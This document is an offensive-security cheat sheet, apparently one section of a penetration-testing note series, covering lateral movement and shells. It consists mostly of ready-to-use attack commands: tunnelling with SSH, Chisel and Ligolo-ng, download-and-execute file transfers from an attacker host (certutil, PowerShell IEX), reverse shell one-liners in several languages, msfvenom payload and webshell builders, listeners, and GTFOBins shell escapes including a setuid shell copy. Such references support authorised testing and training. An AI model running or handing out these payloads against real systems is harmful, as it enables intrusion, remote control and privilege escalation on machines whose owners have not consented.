# 05 - Lateral Movement & Shells

## Port Forwarding

**SSH tunneling**

```
ssh -L 8080:127.0.0.1:8080 user@$TARGET       # local forward
ssh -R 9090:127.0.0.1:9090 user@attacker      # remote forward
ssh -D 1080 user@$TARGET                      # SOCKS proxy
ssh -N -L 5432:db.internal:5432 user@$TARGET  # DB via jump host
```

**Chisel**

```
./chisel server -p 8888 --reverse                    # attacker
./chisel client attacker_ip:8888 R:socks              # target
proxychains nmap -sT -Pn internal_host
```

**Ligolo-ng**

```
./proxy -selfcert                                      # attacker
./agent -connect attacker_ip:11601 -ignore-cert        # target
# console: session -> start -> add route
```

## File Transfer

| Method         | Command                                                                      |
| -------------- | ---------------------------------------------------------------------------- |
| Python HTTP    | `python3 -m http.server 80` → `wget`/`curl`                                  |
| SCP            | `scp file.txt user@$TARGET:/tmp/`                                            |
| SMB (Impacket) | `smbserver.py share $(pwd) -smb2support` → `copy \\attacker\share\file .`    |
| Base64         | `cat file \| base64 -w0` → `echo 'b64' \| base64 -d > file`                  |
| Netcat         | `nc -lvnp 4444 < file` → `nc attacker 4444 > file`                           |
| Certutil (Win) | `certutil -urlcache -split -f http://attacker/file.exe C:\temp\file.exe`     |
| PowerShell     | `IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')` |

## Reverse Shell One-Liners

| Lang/Tool        | Payload                                                                                                                                                                                    |
| ---------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Bash TCP         | `bash -i >& /dev/tcp/ATTACKER/PORT 0>&1`                                                                                                                                                   |
| Bash UDP         | `bash -i >& /dev/udp/ATTACKER/PORT 0>&1`                                                                                                                                                   |
| Python3          | `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'` |
| PHP              | `php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/bash -i <&3 >&3 2>&3");'`                                                                                                             |
| Netcat (OpenBSD) | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc ATTACKER PORT >/tmp/f`                                                                                                          |

Full generator + more languages: [revshells.com](https://www.revshells.com)

## MSFvenom Payloads

| Type         | Command                                                                               |
| ------------ | ------------------------------------------------------------------------------------- |
| Linux ELF    | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell`         |
| Windows EXE  | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe`   |
| PHP webshell | `msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw -o shell.php`                 |
| ASP.NET      | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f aspx -o shell.aspx` |
| WAR (Tomcat) | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o shell.war`      |

## Listener Setup

```
nc -lvnp PORT
rlwrap nc -lvnp PORT
msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST IP; set LPORT PORT; run'
```

## GTFOBins / LOLBAS Quick Index

| Binary         | Shell escape                                  |
| -------------- | --------------------------------------------- |
| find           | `find . -exec /bin/sh \; -quit`               |
| vim            | `vim -c ':!/bin/sh'`                          |
| python/python3 | `python -c 'import os; os.system("/bin/sh")'` |
| bash           | `bash -p`                                     |
| cp             | `cp /bin/sh /tmp/sh && chmod u+s /tmp/sh`     |
| less/more      | `less file` → `!sh`                           |
| awk            | `awk 'BEGIN {system("/bin/sh")}'`             |
| env            | `env /bin/sh`                                 |
